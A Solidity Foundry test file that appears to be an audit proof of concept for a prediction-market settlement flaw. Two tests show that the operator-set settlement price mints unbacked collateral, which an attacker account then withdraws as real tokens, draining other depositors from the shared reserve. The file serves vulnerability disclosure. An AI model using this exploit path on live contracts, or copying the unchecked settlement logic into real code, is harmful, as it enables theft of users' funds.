// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./TransactionProcessor.basic.t.sol";
import "../src/predict/plugins/SettlementPlugin.sol";
import "../src/predict/transactions/SettlementTransLib.sol";
import "forge-std/console.sol";

/// @title PoC (N-4 / ECON-002): Settlement mints collateral at an unconstrained operator price (no oracle/sig)
/// @notice `SettlementTransLib.process` (predict path, LIVE) zeroes the synthetic and credits
/// `collateral += syntheticBalance * settlementPrice`, where `settlementPrice` is a raw operator input in
/// `[0, int128.max]` with NO signature, NO oracle binding, and NO aggregate (YES/NO) conservation check. The
/// operator can therefore settle any position at any price, minting unbacked collateral.
///
/// Two PoCs:
///   - test_PoC_settlementMintsUnbackedCollateralAtOperatorPrice (L2): collateral minted = balance * operator price.
///   - test_PoC_unbackedSettlementDrainsOtherUsersDeposits     (L3): that unbacked collateral is then WITHDRAWN as
///     real tokens out of the shared LoadingZone reserve, so an account that deposited 100 walks away with 5000 —
///     the 4900 excess belonging to other depositors. This proves real fund loss, not just an internal number.
contract PoC_SettlementUnconstrained is TransactionProcessorTestBasic {
    SettlementPlugin settlementPlugin;

    uint256 constant ATTACKER_KEY = 0x5E771E; // settle-target account owner (also signs the withdrawal)
    uint64  constant ATTACKER_UID = 4242;

    function setUp() public override {
        TransactionProcessorTestBasic.setUp();
        // Wire + register the predict SettlementPlugin (mirrors the other plugins in the base harness).
        bytes memory initData = abi.encodeWithSelector(SettlementPlugin.initialize.selector, deployer);
        settlementPlugin = SettlementPlugin(
            address(new TransparentUpgradeableProxy(address(new SettlementPlugin()), address(proxyAdmin), initData))
        );
        vm.startPrank(deployer);
        settlementPlugin.setTransactionProcessor(address(transactionProcessor));
        settlementPlugin.setPosition(address(positionManager));
        transactionProcessor.registerPlugin(address(settlementPlugin));
        vm.stopPrank();

        // Other honest users fund the shared LoadingZone reserve with real tokens.
        deposit(deployerUid, 10_000);
        setOraclePrice();            // oracle (true) price = 1 * FXP
        setFundingIndicesInfo();
        setSyntheticAssetsInfo(synthAssetId, 1_000_000, 1 * FXP_32_ONE);
    }

    function test_PoC_settlementMintsUnbackedCollateralAtOperatorPrice() public {
        // give the deployer account a healthy long synthetic position of 100
        vm.prank(deployer);
        positionManager.getOrCreatePosition(deployerUid, synthAssetId);
        vm.prank(deployer);
        positionManager.updatePositionInDict(deployerUid, 0, synthAssetId, 100);

        int256 colBefore = positionManager.getCollateralBalanceByAccountId(deployerUid);
        int256 synBefore = positionManager.getSyntheticBalance(deployerUid, synthAssetId);
        assertEq(synBefore, 100, "precondition: holds 100 synthetic");

        // The operator picks an ARBITRARY settlement price (50) — the oracle says 1, and no signature/oracle
        // check constrains it. (settlementPrice is also raw-scaled, so an FXP-scaled price would over-credit 2^32.)
        int256 operatorPrice = 50;
        Settlement memory s = Settlement({
            accountId: deployerUid, syntheticAssetId: synthAssetId, settlementPrice: operatorPrice
        });
        bytes[] memory txs = new bytes[](1);
        txs[0] = getMessage(TYPE_SETTLEMENT, abi.encode(s));
        executeMultiTransactions(txs);

        int256 colAfter = positionManager.getCollateralBalanceByAccountId(deployerUid);
        int256 synAfter = positionManager.getSyntheticBalance(deployerUid, synthAssetId);
        assertEq(synAfter, 0, "synthetic zeroed by settlement");
        // collateral minted == balance * operator-chosen price, with NO oracle/signature/conservation constraint
        assertEq(colAfter - colBefore, synBefore * operatorPrice,
            "BUG: collateral minted = balance * UNCONSTRAINED operator price (unbacked, no oracle/signature)");
        assertGt(colAfter - colBefore, 0, "unbacked collateral created");

        console.log("oracle price (FXP):", uint256(int256(1 * FXP_32_ONE)));
        console.log("operator settlement price used:", uint256(operatorPrice));
        console.log("unbacked collateral minted:", uint256(colAfter - colBefore));
    }

    /// L3: the unbacked collateral is real-withdrawable and drains other depositors' tokens from LoadingZone.
    function test_PoC_unbackedSettlementDrainsOtherUsersDeposits() public {
        address attacker = vm.addr(ATTACKER_KEY);

        // The attacker's account is registered normally; their ONLY legitimate stake is a 100-token deposit.
        addSingleSigner(ATTACKER_UID, attacker, ATTACKER_KEY);
        deposit(ATTACKER_UID, 100);

        // They hold a synthetic position of 100. At the TRUE oracle price (1) it is worth 100 collateral.
        vm.prank(deployer);
        positionManager.getOrCreatePosition(ATTACKER_UID, synthAssetId);
        vm.prank(deployer);
        positionManager.updatePositionInDict(ATTACKER_UID, 0, synthAssetId, 100);

        uint256 poolBefore = testToken.balanceOf(address(loadingZone));
        uint256 attackerTokensBefore = testToken.balanceOf(attacker);
        uint256 truePriceValue = 100; // synthetic 100 * oracle price 1

        // Operator settles at 50x the true price -> mints 5000 collateral for a position truly worth 100.
        int256 operatorPrice = 50;
        Settlement memory s = Settlement({
            accountId: ATTACKER_UID, syntheticAssetId: synthAssetId, settlementPrice: operatorPrice
        });
        bytes[] memory stx = new bytes[](1);
        stx[0] = getMessage(TYPE_SETTLEMENT, abi.encode(s));
        executeMultiTransactions(stx);

        // The account owner (permissionless from here) withdraws the unbacked collateral to their own address.
        Withdrawal memory w = createWithdrawal(ATTACKER_UID, attacker, 5_000, 0, ATTACKER_KEY);
        bytes[] memory wtx = new bytes[](1);
        wtx[0] = getMessage(TYPE_WITHDRAWAL, abi.encode(w));
        executeMultiTransactions(wtx);

        uint256 poolAfter = testToken.balanceOf(address(loadingZone));
        uint256 withdrawn = testToken.balanceOf(attacker) - attackerTokensBefore;

        // L3 outcome: real tokens left the shared LoadingZone reserve and reached the attacker.
        assertEq(withdrawn, 5_000, "attacker received 5000 REAL tokens from the shared pool");
        assertEq(poolBefore - poolAfter, 5_000, "shared LoadingZone reserve drained by 5000");
        // The position was truly worth 100 and the attacker deposited only 100, yet 5000 left the pool:
        // the 4900 excess was other depositors' money.
        assertGt(withdrawn, truePriceValue, "withdrew far more than the position's true-oracle-price value");
        assertGt(withdrawn, uint256(100), "extracted more than ever deposited -> drains other depositors");

        console.log("attacker legitimate deposit:", uint256(100));
        console.log("position true value at oracle price:", truePriceValue);
        console.log("real tokens withdrawn by attacker:", withdrawn);
        console.log("shared reserve drained:", poolBefore - poolAfter);
    }
}
